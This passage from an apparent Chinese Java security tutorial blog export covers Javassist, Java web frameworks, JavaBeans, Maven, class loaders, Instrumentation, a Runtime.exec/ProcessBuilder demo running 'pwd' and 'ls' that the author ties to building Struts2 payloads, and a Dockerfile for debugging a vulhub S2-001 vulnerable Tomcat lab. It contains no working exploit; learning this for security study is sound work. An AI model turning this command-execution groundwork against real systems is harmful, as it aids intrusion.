：表示类中的字段。\n```\n\n下面以简单的一个实例来说明下基本的使用方法。这个实例是在执行完类中的方法时候加入一些操作。\n\n1、定义个测试类User\n\n```java\npackage com.demo.manba;\n\nimport java.lang.String;\n\npublic class User {\n    private String name;\n\n    public User() {\n    }\n\n    public String getUser() {\n        return this.name;\n    }\n\n    public void setUser(String name) {\n        this.name = name;\n    }\n\n}\n```\n\n2、 执行\n\n```java\npackage com.demo.manba;\n\nimport javassist.*;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class DynGenerateClass {\n    public static void main(String[] args) throws NotFoundException, CannotCompileException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n            // 获取默认池\n            ClassPool pool = ClassPool.getDefault();\n            CtClass cc = pool.get(\"com.demo.manba.User\");\n            // 获取所有方法\n            CtMethod[] cms = cc.getDeclaredMethods();\n            for(CtMethod cm:cms){\n                System.out.println(cm.getName());\n            }\n            // 在执行setUser方法后执行\n            cms[1].insertAfter(\"System.out.println(\\\"I hava execute setUser Success.\\\");\");\n            Class clazz = cc.toClass();\n            // 实例化\n            User u=(User) clazz.getConstructor(new Class[]{}).newInstance(new Object[]{});\n            u.setUser(\"mike\");\n            System.out.println(u.getUser());\n            // cc.writeFile();\n        }\n\n}\n```\n\n输出\n\n![](/images/a2/4.png)\n\n**参考：**\n\nhttps://blog.csdn.net/a745233700/article/details/82893076\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/87974728\n\nhttps://blog.csdn.net/justloveyou_/article/details/79407248\n\nhttps://blog.csdn.net/vae1314chuanchen/article/details/78266299\n","tags":["JAVA","动态代理","反射"],"categories":["JAVA安全教程"]},{"title":"JAVA框架介绍","url":"/2018/12/04/JAVA框架介绍/","content":"# 什么是框架\n\n在编程领域，软件框架是指一种抽象形式，它提供了一个具有通用功能的软件，这些功能可以由使用者编写代码来有选择的进行更改，从而提供服务于特定应用的软件。软件框架提供了一种标准的方式来构建并部署应用。\n<!-- more -->\n# Struts2框架介绍\n\n直接上图\n\n![](/images/a3/1.png)\n\nStruts2框架最主要的两个组件就是过滤器和拦截器，其中用到的思想就是上一章的反射和动态代理。\n\n**工作流程：**\n\n1. 客户端浏览器发送HTTP请求到Web应用\n2. Web容器将请求传递到标准ActionContextCleanUp过滤器以消除属性，而不让后续过滤器清楚，以延长Action中属性（包括自定义属性）的生命周期。\n3. 再经过如stimesh等其他过滤器后，请求传递给StrutsPrepareAndExecuteFilter核心控制器\n4. StrutsPrepareAndExecuteFilter调用ActionMapper（Action映射器）确定调用哪个Action，再将控制权转移给ActionProxy代理\n5. ActionProxy代理调用配置管理器ConfigurationManager从配置文件struts.xml中读取配置信息，然后创建ActionInvocation对象\n6. ActionInvocation在调用拦截器链中的拦截器后再调用Action，根据Action返回的结果字符串查找对应的Result\n7. Result调用视图模板，再以相反的顺序执行拦截器链，返回HTTP响应\n8. HTTP响应以相反的顺序返回给核心控制器StrutsPrepareAndExecuteFilter以及其他web.xml中定义的过滤器，最终返回给客户端\n\nstruts2可以说是上一代的web框架，现在基本很少互联网会使用strust2，一来安全问题较多，二来现在有更方便的springboot框架，基本可以说被遗弃了。但是作为安全学习，我们还是有必要了解下基本的框架体系，如果想要深入的学习，可以网上自己搜索，作为曾经火遍大江南北的web框架，网上资料还是很多的。\n\n# Spring框架介绍\n\nspring是一个一站式开发框架集，功能十分强大，就像一个大家族，有众多衍生产品，例如：springboot、springcloud、springsecurity等等。但他们都是基于spring的ioc和aop，**ioc提供了依赖注入的容器，aop解决了面向切面的编程**，然后在这两者的基础上实现了其他衍生产品的高级功能。\n\n## 什么是IOC\n\n控制反转（Inversion of Control）不是技术，是一种**设计思想**。所谓控制反转是指，本来被调用者的实例是由调用者来创建的，这样的缺点是耦合性太强，IOC则是统一交给spring来管理创建，将对象交给容器管理，你只需要在spring配置文件总配置相应的bean，以及设置相关的属性，让spring容器来生成类的实例对象以及管理对象。在spring容器启动的时候，spring会把你在配置文件中配置的bean都初始化好，然后在你需要调用的时候，就把它已经初始化好的那些bean分配给你需要调用这些bean的类。 \n\n传统设计\n\n![](/images/a3/2.png)\n\nioc思想\n\n![](/images/a3/3.png)\n\n## 什么是AOP\n\n面向切面编程（Aspect Oriented Programming）它与 OOP( Object-Oriented Programming, 面向对象编程) 相辅相成，提供了与 OOP 不同的抽象软件结构的视角来思考程序的结构，通过这种方式弥补面向对象编程(Object Oriented Programming)的不足。除了类以外，AOP提供了切面，切面对关注点进行模块化，例如横切多个类型和对象的事务管理（这些关注点术语通常称作横切(crosscutting)关注点）。Spring AOP是Spring的一个重要组件，但是Spring IOC并不依赖于Spring AOP，这意味着你可以自由选择是否使用AOP，AOP提供了强大的中间件解决方案，这使得Spring IOC更加完善。我们可以通过AOP来实现**日志监听，事务管理，权限控制**等等。\n\n**概念：**\n\n```\n切面（Aspect）：一个关注点的模块化，这个关注点可能会横切多个对象。事务管理是J2EE应用中一个关于横切关注点的很好的例子。在Spring AOP中，切面可以使用基于模式）或者基于@Aspect注解的方式来实现。\n\n连接点（Joinpoint）：在程序执行过程中某个特定的点，比如某方法调用的时候或者处理异常的时候。在Spring\nAOP中，一个连接点总是表示一个方法的执行。\n\n通知（Advice）：在切面的某个特定的连接点上执行的动作。其中包括了“around”、“before”和“after”等不同类型的通知（通知的类型将在后面部分进行讨论）。许多AOP框架（包括Spring）都是以拦截器做通知模型，并维护一个以连接点为中心的拦截器链。\n\n切入点（Pointcut）：匹配连接点的断言。通知和一个切入点表达式关联，并在满足这个切入点的连接点上运行（例如，当执行某个特定名称的方法时）。切入点表达式如何和连接点匹配是AOP的核心：Spring缺省使用AspectJ切入点语法。\n\n引入（Introduction）：用来给一个类型声明额外的方法或属性（也被称为连接类型声明（inter-type\ndeclaration））。Spring允许引入新的接口（以及一个对应的实现）到任何被代理的对象。例如，你可以使用引入来使一个bean实现IsModified接口，以便简化缓存机制。\n\n目标对象（Target Object）： 被一个或者多个切面所通知的对象。也被称做被通知（advised）对象。 既然Spring\nAOP是通过运行时代理实现的，这个对象永远是一个被代理（proxied）对象。\n\nAOP代理（AOP Proxy）：AOP框架创建的对象，用来实现切面契约（例如通知方法执行等等）。在Spring中，AOP代理可以是JDK动态代理或者CGLIB代理。\n\n织入（Weaving）：把切面连接到其它的应用程序类型或者对象上，并创建一个被通知的对象。这些可以在编译时（例如使用AspectJ编译器），类加载时和运行时完成。Spring和其他纯Java AOP框架一样，在运行时完成织入。\n\n通知类型：\n\n前置通知（Before advice）：在某连接点之前执行的通知，但这个通知不能阻止连接点之前的执行流程（除非它抛出一个异常）。\n\n后置通知（After returning advice）：在某连接点正常完成后执行的通知：例如，一个方法没有抛出任何异常，正常返回。\n\n异常通知（After throwing advice）：在方法抛出异常退出时执行的通知。\n\n最终通知（After (finally) advice）：当某连接点退出的时候执行的通知（不论是正常返回还是异常退出）。\n\n环绕通知（Around Advice）：包围一个连接点的通知，如方法调用。这是最强大的一种通知类型。环绕通知可以在方法调用前后完成自定义的行为。它也会选择是否继续执行连接点或直接返回它自己的返回值或抛出异常来结束执行。\n```\n\n看完了上面的理论部分知识, 相信大家还是对AOP 的概念云里雾里的, 因为 AOP 中的概念是在是太多了, 我们也不必理解的那么透彻，直接从网上找个例子说明一下 AOP 中 Aspect，Joint point，Point cut 与 Advice之间的关系。\n\n```\n让我们来假设一下，从前有一个叫爪哇的小县城，在一个月黑风高的晚上，这个县城中发生了命案。 作案的凶手十分狡猾，现场没有留下什么有价值的线索。不过万幸的是，刚从隔壁回来的老王恰好在这时候无意中发现了凶手行凶的过程，但是由于天色已晚，加上凶手蒙着面，老王并没有看清凶手的面目，只知道凶手是个男性，身高约七尺五寸。 爪哇县的县令根据老王的描述，对守门的士兵下命令说: 凡是发现有身高七尺五寸的男性，都要抓过来审问。 士兵当然不敢违背县令的命令，只好把进出城的所有符合条件的人都抓了起来。\n\n来让我们看一下上面的一个小故事和 AOP 到底有什么对应关系。\n\n首先我们知道，在 Spring AOP 中 Joint point 指代的是所有方法的执行点，而 point cut 是一个描述信息，它修饰的是 Joint point，通过 point cut，我们就可以确定哪些 Joint point 可以被织入 Advice。 对应到我们在上面举的例子，我们可以做一个简单的类比，Joint point 就相当于 爪哇的小县城里的百姓,pointcut 就相当于 老王所做的指控，即凶手是个男性，身高约七尺五寸，而 Advice 则是施加在符合老王所描述的嫌疑人的动作: 抓过来审问。\n为什么可以这样类比呢?\n\nJoint point ： 爪哇的小县城里的百姓: 因为根据定义，Joint point 是所有可能被织入 Advice 的候选的点，在 Spring AOP中，则可以认为所有方法执行点都是 Joint point。 而在我们上面的例子中，命案发生在小县城中，按理说在此县城中的所有人都有可能是嫌疑人。\n\nPointcut ：男性，身高约七尺五寸: 我们知道，所有的方法(joint point) 都可以织入 Advice，但是我们并不希望在所有方法上都织入 Advice，而 Pointcut 的作用就是提供一组规则来匹配join point，给满足规则的 join point 添加 Advice。 同理，对于县令来说，他再昏庸，也知道不能把县城中的所有百姓都抓起来审问，而是根据凶手是个男性，身高约七尺五寸，把符合条件的人抓起来。 在这里 凶手是个男性，身高约七尺五寸 就是一个修饰谓语，它限定了凶手的范围，满足此修饰规则的百姓都是嫌疑人，都需要抓起来审问。\n\nAdvice ：抓过来审问，Advice 是一个动作，即一段 Java 代码，这段 Java 代码是作用于 point cut 所限定的那些 Joint point 上的。 同理，对比到我们的例子中，抓过来审问 这个动作就是对作用于那些满足 男性，身高约七尺五寸 的爪哇的小县城里的百姓。\n\nAspect:：Aspect 是 point cut 与 Advice 的组合，因此在这里我们就可以类比: “根据老王的线索，凡是发现有身高七尺五寸的男性，都要抓过来审问” 这一整个动作可以被认为是一个 Aspect。\n```\n\n说完AOP专业名词的概念，再来说下AOP具体的。相信大家对于OOP的理解不难，就以人（people）来说，我们就可以把它看做一类对象，people有身高、体重、年龄等属性，也有跑步、吃饭、睡觉、娱乐等行为，把这些属于people的属性和行为封装在people类中，然后以统一调用的方式（创建一个people类实例对象，通过这个对象实例来调用这些属性和行为）就叫做OOP思想。\n\nOOP给我们的感觉就是结构清晰，高内聚，易维护等。这些属于一种从上到下的关系（即这个类封装的所有属性和方法都是属于people的），而我们的AOP思想就是一种从左到右的关系，以切入的方式将业务逻辑功能应用到每一层结构中（可以理解为类方法，类方法也是一种对象的行为实现）。\n\n举个例子，people也可以分为少年、青年、中年、和老年，这几类人除了拥有自己的属性和行为外，生活中，或许还需要去医院看病，但是医院看病这一个逻辑业务功能并不是属于哪一类，而是谁生病了，才需要到医院看病，而基于面向对象编程的思想，我们是不可能把这一个业务逻辑行为加到每一个类中的，这不符合OOP思想，而这个就是AOP所做也可以做到事情了，AOP就是把医院看病这一个业务逻辑功能抽取出来，然后动态把这个功能注入到需要的方法（或行为）中，以后，不管是谁需要看病，就到医院这个第三方机构看病（AOP就是相当于把这个第三方机构独立出来），**这样从业务逻辑角度上，AOP达到了更近一步的的解耦，所以我们也称AOP是对OOP的完善和增强。**\n\n而我们的编程中，常用到AOP的就是安全校验、日志操作、事务操作等，接下来一张图认识AOP思想：\n\n![](/images/a3/4.png)\n\n AOP就是使用上图所示的“横切”技术，AOP把软件系统分为两个部分：**核心关注点和横切关注点**。业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处都基本相似。比如权限认证、日志、事务处理。Aop 的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。正如Avanade公司的高级方案构架师Adam Magee所说，AOP的核心思想就是**“将应用程序中的商业逻辑同对其提供支持的通用服务进行分离。”**\n\n## SpringMVC框架\n\n**SpringMVC** 是基于 Java 语言实现 MVC 设计模式的请求驱动类型的轻量级 Web 框架，目的是将 Web 开发模块化及代码简化。其提供了 DispatcherServlet 前端控制器分派请求，同时提供灵活的配置处理程序映射、视图解析，并支持文件上传。\n\n![](/images/a3/5.png)\n\n\n\n## MyBatis框架\n\nMyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\n\n![](/images/a3/6.png)\n\n**MyBatis 的优点如下：**\n\n- 封装了 JDBC 大部分操作，减少开发人员工作量；\n- 相比一些自动化的 ORM 框架，“半自动化”使得开发人员可以自由的编写 SQL 语句，灵活度更高；\n- Java 代码与 SQL 语句分离，降低维护难度；\n- 自动映射结果集，减少重复的编码工作；\n- 开源社区十分活跃，文档齐全，学习成本不高。\n\n## SpringBoot框架\n\n### 什么是SpringBoot\n\nSpring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架（不知道这样比喻是否合适）。\n\n### SpringBoot四个主要特性\n\n1. SpringBoot Starter：他将常用的依赖分组进行了整合，将其合并到一个依赖中，这样就可以一次性添加到项目的Maven或Gradle构建中；\n\n2. 自动配置：SpringBoot的自动配置特性利用了Spring4对条件化配置的支持，合理地推测应用所需的bean并自动化配置他们；\n\n3. 命令行接口：（Command-line-interface, CLI）：SpringBoot的CLI发挥了Groovy编程语言的优势，并结合自动配置进一步简化Spring应用的开发；\n\n4. Actuatir：它为SpringBoot应用的所有特性构建一个小型的应用程序。\n\n**简单来说，springboot也是属于spring框架中的一种，但是springboot”约定大于配置“的丽娘，极大简化了spring应用的初始搭建以及开发过程**\n\n# 框架比较\n\n**struts2 和 springMvc：**\n\n1. springmvc入口是一个servlet前端控制器(DispatcherServlet)，struts2入口是一filter过滤器(StrutsPrepareAndExecuteFilter)。\n\n2. struts2通过在action类中定义成员变量接收参数，(属性驱动和模型驱动)，它只能使用多例模式管理action。springmvc通过在coontroller方法中定义形参接收参数，springmvc可以使用单例模式管理controller。 \n\n3. springmvc是基于方法开发的，注解开发中使用requestMapping将url和方法进行映射，如果根据url找到controller类的方法生成一个handler处理器对象(只包括一个method)。struts2是基于类开发的，每个请求过来创建一个action实例，实例对象中有若干个方法。开发中建议使用springmvc，springmvc方法更类似service业务方法。\n4. struts2采用值栈存储请求和相应的数据,通过OGNL存取数据，springmvc通过参数绑定期将request请求内容解析，并给方法形参赋值。\n5. struts2和springmvc的速度是相当的，由于struts2的漏洞较多，更多企业使用springmvc。\n\n**springMvc和springBoot：**\n\n1. springMvc属于一个企业WEB开发的MVC框架，涵盖面包括前端视图开发、文件配置、后台接口逻辑开发等，XML、config等配置相对比较繁琐复杂。\n2. springBoot框架相对于springMvc框架来说，更专注于开发微服务后台接口，不开发前端视图。\n\n\n**参考：**\n\nhttps://mybatis.org/mybatis-3/zh/index.html\n\nhttps://blog.csdn.net/qq_42494445/article/details/83926216\n\nhttps://blog.csdn.net/qq_41701956/article/details/81215309\n\nhttps://blog.csdn.net/wangzhidong_java/article/details/82974503","tags":["JAVA","安全"],"categories":["JAVA安全教程"]},{"title":"JAVA基础教程","url":"/2018/11/26/JAVA基础教程/","content":"\n# 简介\n\n本篇是整个java安全学习系列的基础篇，这个系列篇章我会把我的整个java安全学习过程进行一个总结。至于为什么想写这个系列文章，是因为当时听了小伙伴的分享中提到“21小时可以入门任何课程”，看了他整理的学习导图，深受启发。所以，我打算把过去的和新学习的东西，完整的、系统的归纳总结出来，做到温故而知新。\n\n# 学习流程\n\n![](/images/a1/1.png)\n\n这个是我整理的java的学习路线图，每个人可能有不同的理解，大家可以自己动手进行自己的学习规划。并且学习过程是动态的，可能在学习总结过程中，我会修增某些模块。本篇我将对第一部分-基础，进行讲解。\n\n# java基础\n\n这边讨论的基础，不是java的基础语法，这部分自己可以快速入门学习。我要讲的部分，是java的一些特性，或者比较重要的语法，在看代码中或者分析payload经常用到的。这部分是我在实践过程中觉得难点和重点，每个人的理解方法不同，所以并不适用所有人的学习，不过理解以下概念方法对于java安全学习是有帮助的，这点可以肯定。\n\n## 基本语法\n\n### 泛类型\n\n泛型，即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？\n\n顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。\n\n泛型的本质是为了参数化类型（在不创建新的类型的情况下，通过泛型指定的不同类型来控制形参具体限制的类型）。也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。\n\n最典型的泛型类应用就是各种容器类，如：List、Set、Map。自己定义的泛型类形式如下：\n\n```java\n//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型\n//在实例化泛型类时，必须指定T的具体类型\npublic class Generic<T>{ \n    //key这个成员变量的类型为T,T的类型由外部指定  \n    private T key;\n\n    public Generic(T key) { //泛型构造方法形参key的类型也为T，T的类型由外部指定\n        this.key = key;\n    }\n\n    public T getKey(){ //泛型方法getKey的返回值类型为T，T的类型由外部指定\n        return key;\n    }\n}\n```\n\n更多泛型基本知识内容可参考：[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\n### 对象类型、基本类型\n\nJava中的对象分两种类型：**基本类型和非基本类型（对象类型）。**\n\n基本类型就是那些最常用的类型，例如：boolean/char/byte/short/int/long/float/double，这些类型有个特点，就是变量直接存储值。\n\n除了基本类型之外的都是非基本类型了。非基本类型有个显著特点就是初始化的时候一般需要使用new来创建一个对象，所以非基本类型也叫非基本类型。例如:String name=new String(Tom);。非基本类型跟基本类型的本质区别，在于**非基本类型变量存储的不是值，而是引用。**\n\n## 命令执行的方法\n\njava命令执行，主要有两种方法Runtime.getRuntime().exec(cmd) 和ProcessBuilder(cmd).start，实例如下：\n\n```java\npackage com.manba.demo;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class CmdTest {\n    public static void rexec() throws IOException {\n        String cmds = \"/bin/sh -c pwd\"; // 也可以数组形式\n        Process process = Runtime.getRuntime().exec(cmds);\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void pexexc() throws IOException {\n        String[] cmds = {\"/bin/sh\", \"-c\", \"ls\"}; // 只能数组形式\n        Process pb = new ProcessBuilder(cmds).start();\n        BufferedReader Reader = new BufferedReader(new InputStreamReader(pb.getInputStream()));\n        String line;\n        while ((line = Reader.readLine()) != null) System.out.println(line);\n    }\n\n    public static void main(String[] args) throws IOException {\n        rexec();\n        pexexc();\n    }\n\n}\n```\n\n这两个方法的主要区别在于Runtime.getRuntime.exec是静态方法，而ProcessBuilder().start不是静态方法，这在strust2中构造payload，是很有用的。\n\n## Java Bean和Factory概念\n\n**JavaBeans**：Java中一种**特殊的类**，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。\n\n```java\npackage com.manba.demo; \npublic class SimpleBean{  \n    private String name;  \n    private int age;  \n    public void setName(String name){  \n        this.name = name;  \n    }  \n    public void setAge(int age){  \n        this.age = age;  \n    }  \n    public String getName(){  \n        return this.name;  \n    }  \n    public int getAge(){  \n        return this.age;  \n    }  \n}  \n```\n\n**总结如下：**\n\n1. 所有的类必须声明为public \n\n2. 所有属性为private\n3. 提供默认构造方法\n4. 提供getter和setter\n5. 实现serializable接口\n\n**Java Factory定义**：定义一个创建对象的接口，但让实现这个接口的类来决定实例化哪个类，工厂方法让类的实例化推迟到了子类中进行，它属于创建类型。\n\n```\n通俗理解与做法：\n\t\t定义一个抽象类或者接口来当规范工厂，它是一个只声明方法叫什么名字不实现方法的内容的一个规范类；\n  \t定义具体工厂实现或者继承规范工厂，然后重写规范工厂中定义的方法，在该方法中生产属于自己工厂的对象;\n  \t使用的时候，new工厂的时候是具体工厂给规范工厂进行赋值。即=号左边是规范工厂类型，右边是具体工厂类型，想获哪个具体工厂生产的对象就使用哪个具体工厂类型，最后利用对象调用方法来获取具体工厂生产的;\n\n注意点：\n\t\t要有一个规范工厂，该工厂只负责声明方法叫什么名字，不实现方法的内容;\n    每一个具体工厂都要继承或者实现规范工厂，重写它的方法，在方法中生产自己工厂的对象;\n    使用的时候一定要具体工厂给规范工厂进行赋值;\n```\n\n代码案例：\n\n```java\n//StandardFactory----规范工厂      \n//SpecificFactory----具体工厂       \npackage com.manba.demo;\n\npublic class Product {\n    interface StandardFactory {\n        public Product createProduct();\t\t//声明了方法叫这个名字\n    }\n\n    static class SpecificFactory implements StandardFactory {\n        @Override\n        public Product createProduct() {\t//具体工厂实现规范工厂并重写它的方法生产属于工厂的对象\n            return new Product();         //这是属于该具体工厂生产的对象\n        }\n    }\n\n    public static class Client {\n        public static void main(String[] args) {\n            StandardFactory factory = new SpecificFactory();\n            Product prodect = factory.createProduct();\n        }\n    }\n}\n```\n\n## Java Maven\n\nMaven 翻译为\"专家\"、\"内行\"，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。\n\nPOM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。执行任务或目标时，Maven 会在当前目录中查找 POM。它读取 POM，获取所需的配置信息，然后执行目标。\n\nPOM 中可以指定以下配置：\n\n- 项目依赖\n- 插件\n- 执行目标\n- 项目构建 profile\n- 项目版本\n- 项目开发者列表\n- 相关邮件列表信息\n\n**Maven 参数**\n\n-D 传入属性参数 \n-P 使用pom中指定的配置 \n-e 显示maven运行出错的信息 \n-o 离线执行命令,即不去远程仓库更新包 \n-X 显示maven允许的debug信息 \n-U 强制去远程参考更新snapshot包 \n其他参数可以通过mvn help 获取\n\n**1、mvn clean** \n\n说明: 清理项目生产的临时文件,一般是模块下的target目录\n\n**2、mvn package** \n\n说明: 项目打包工具,会在模块下的target目录生成jar或war等文件，如下运行结果\n\n**3、mvn test** \n\n说明: 测试命令,或执行src/test/java/下junit的测试用例\n\n**4、mvn install** \n\n说明: 模块安装命令 将打包的的jar/war文件复制到你的本地仓库中，供其他模块使用。 -Dmaven.test.skip=true 跳过测试(同时会跳过test compile)\n\n**5、mvn deploy** \n\n说明: 发布命令 将打包的文件发布到远程参考,提供其他人员进行下载依赖 ,一般是发布到公司的私服\n\n**mvn 快速构建java项目命令**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false\n```\n\n**mvn 快速构建web项目**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.automobile -DartifactId=trucks -DarchetypeArtifactId=maven-archetype-webapp  -DinteractiveMode=false\n```\n\nMaven内容很多，这边给大家介绍下概念，以及最基本用法，详细知识点大家可以移步到https://www.runoob.com/maven/maven-tutorial.html学习。\n\n## IDEA调试远程调试\n\n**配置tomcat调试模式**\n\ndockerfile配置样例，tomcat以调试模式打开\n\n```dockerfile\nFROM vulhub/tomcat:8.5\n\nMAINTAINER phithon <root@leavesongs.com>\n\nUSER root\nRUN set -ex \\\n    && rm -rf /usr/local/tomcat/webapps/* \\\n    && chmod a+x /usr/local/tomcat/bin/*.sh\nCOPY S2-001.war /usr/local/tomcat/webapps/ROOT.war\nENV JPDA_ADDRESS 5005\nENV JPDA_TRANSPORT dt_socket\nCMD [\"catalina.sh\", \"jpda\", \"run\"]\nEXPOSE 8080\nEXPOSE 5005\n```\n\ndocker-compose.yml配置样例\n\n```dockerfile\nversion: '2'\nservices:\n struts2:\n   build: .\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n```\n\n然后docker-compose up -d就启动tomcat的调试模式\n\n**配置IDEA，连接远程服务器**\n\n点击Edit Configurations\n\n![](/images/a1/2.png)\n\n配置Remote\n\n![](/images/a1/3.png)\n\n点击debug，连接成功显示如下所示内容\n\n![](/images/a1/4.png)\n\n# JVM类加载器\n\n## 类加载器简介\n\n类加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。**类加载器负责读取 Java 字节代码，并转换成 java.lang.Class 类的一个实例**。每个这样的实例用来表示一个 Java 类。\n\n**基本上所有的类加载器都是 java.lang.ClassLoader 类的一个实例**。java.lang.ClassLoader 类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节代码，然后从这些字节代码中定义出一个 Java 类，即 java.lang.Class 类的一个实例。\n\nJava 中的类加载器大致可以分成两类，一类是系统提供的，另外一类则是由 Java 应用开发人员编写的，开发人员可以通过继承 java.lang.ClassLoader 类的方式实现自定义类加载器，以满足一些特殊的需求。\n\n系统提供的类加载器主要有下面三个：\n\n- **引导类加载器(Bootstrap ClassLoader)**：负责将 $JAVA_HOME/lib 或者 -Xbootclasspath 参数指定路径下面的文件(按照文件名识别，如 rt.jar) 加载到虚拟机内存中。它用来加载 Java 的核心库，是用原生代码实现的，并不继承自 java.lang.ClassLoader，引导类加载器无法直接被 java 代码引用。\n- **扩展类加载器(Extension ClassLoader)**：负责加载 $JAVA_HOME/lib/ext 目录中的文件，或者 java.ext.dirs 系统变量所指定的路径的类库，它用来加载 Java 的扩展库。\n- **应用程序类加载器(Application ClassLoader)**：一般是系统的默认加载器，它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般 Java 应用的类都是由它来完成加载的，可以通过 ClassLoader.getSystemClassLoader() 来获取它。\n\n## 类加载过程 — 双亲委派模型\n\n（1） 类加载器结构\n\n除了引导类加载器之外，所有的类加载器都有一个父类加载器。应用程序类加载器的父类加载器是扩展类加载器，扩展类加载器的父类加载器是引导类加载器。一般来说，开发人员自定义的类加载器的父类加载器是应用程序类加载器。\n\n![](/images/a1/5.png)\n\n（2）双亲委派模型\n\n类加载器在尝试去查找某个类的字节代码并定义它时，会先代理给其父类加载器，由父类加载器先去尝试加载这个类，如果父类加载器没有，继续寻找父类加载器，依次类推，如果到引导类加载器都没找到才从自身查找。这个类加载过程就是双亲委派模型。\n\n首先要明白，**Java 虚拟机判定两个 Java 类是否相同，不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样(可以通过 class.getClassLoader() 获得)**。只有两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。不同类加载器加载的类之间是不兼容的。\n\n双亲委派模型就是为了保证 Java 核心库的类型安全的。所有 Java 应用都至少需要引用 java.lang.Object 类，也就是说在运行的时候，java.lang.Object 这个类需要被加载到 Java 虚拟机中。如果这个加载过程由 Java 应用自己的类加载器来完成的话，很可能就存在多个版本的 java.lang.Object 类，而这些类之间是不兼容的。通过双亲委派模型，对于 Java 核心库的类加载工作由引导类加载器来统一完成，保证了 Java 应用所使用的都是同一个版本的 Java 核心库的类，是互相兼容的。\n\n类加载器在成功加载某个类之后，会把得到的 java.lang.Class 类的实例缓存起来。下次再请求加载该类的时候，类加载器会直接使用缓存的类的实例，而不会尝试再次加载。\n\n# Java字节码技术\n\n## ASM\n\n对于需要手动操纵字节码的需求，可以使用ASM，它可以直接生产 .class字节码文件，也可以在**类被加载入JVM之前**动态修改类行为。ASM的应用场景有AOP（Cglib就是基于ASM）、热部署、修改其他jar包中的类等。\n\n先看ASM对字节码操作的过程图\n\n![在这里插入图片描述](/images/a1/0.png)\n\n\n\n## JavaAssist\n\nASM虽然可以达到修改字节码的效果，但是代码实现上更偏底层，是一个个虚拟机指令的组合，不好理解、记忆，和Java语言的编程习惯有较大差距。\n\n利用Javassist实现字节码增强时，可以无须关注字节码刻板的结构，其优点就在于编程简单。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构或者动态生成类。\n\n## Instrumentation\n\n上面JavaAssist有什么缺点？\n\n上面ASM和JavaAssist的Demo，都有一个共同点：**两者例子中的目标类都没有被提前加载到JVM中**，如果只能在类加载前对类中字节码进行修改，那将失去其存在意义，毕竟大部分运行的Java系统，都是在运行状态的线上系统。\n\nJava Instrumentation指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在JVM上的应用程序。这种监测和协助包括但不限于获取JVM运行时状态，替换和修改类定义等。简单一句话概括下：Java Instrumentation可以在JVM启动后，动态修改已加载或者未加载的类，包括类的属性、方法。要使用instrument的类修改功能，我们需要实现它提供的ClassFileTransformer接口，定义一个类文件转换器。\n**先看下其关键方法**\n\n```java\npublic interface Instrumentation {\n    //添加一个类文件转换器\n    void addTransformer(ClassFileTransformer transformer);\n    //重新加载一个类，加载时触发ClassFileTransformer接口\n    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;\n}\n```\n\n我们需要实现ClassFileTransformer接口，并在自定义的transform方法中，利用ASM或者JavaAssist等字节码操作框架对类的字节码进行修改，修改后返回字节码的byte[]数组\n\n自定义实现如下ClassFileTransformer，过滤掉类名不是AopDemoServiceWithoutInterface的类，同时使用JavaAssist对AopDemoServiceWithoutInterface进行增强\n\n```java\npublic class MyClassTransformer implements ClassFileTransformer {\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n        if (!className.equals(\"aop/demo/service/AopDemoServiceWithoutInterface\")) {\n            return null;\n        }\n        try {\n            System.out.println(\"MyClassTransformer，当前类名:\" + className);\n            ClassPool 